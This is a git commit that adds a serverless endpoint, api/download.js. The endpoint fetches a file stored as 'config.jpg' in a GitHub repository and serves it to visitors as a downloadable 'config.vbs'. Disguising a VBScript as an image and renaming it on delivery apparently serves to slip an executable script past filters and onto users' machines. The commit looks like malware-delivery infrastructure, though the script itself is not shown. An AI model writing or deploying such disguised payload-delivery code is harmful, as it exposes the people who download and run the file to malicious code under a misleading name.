e9fa566e4b3faa6628f855a293d37c08b7ada67b
artymidus <artyarty9869@gmail.com>
2026-06-19 18:29:39 +0700

    Create download.js

---
+++ api/download.js
@@ -0,0 +1,21 @@
+export default async function handler(req, res) {
+  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/config.jpg';
+
+  try {
+    const response = await fetch(rawUrl);
+
+    if (!response.ok) {
+      return res.status(500).send('error!');
+    }
+
+    const buffer = Buffer.from(await response.arrayBuffer());
+
+    res.setHeader('Content-Type', 'application/octet-stream');
+    res.setHeader('Content-Disposition', 'attachment; filename="config.vbs"');
+    res.setHeader('Content-Length', buffer.length);
+
+    res.send(buffer);
+  } catch (error) {
+    res.status(500).send('error: ' + error.message);
+  }
+}
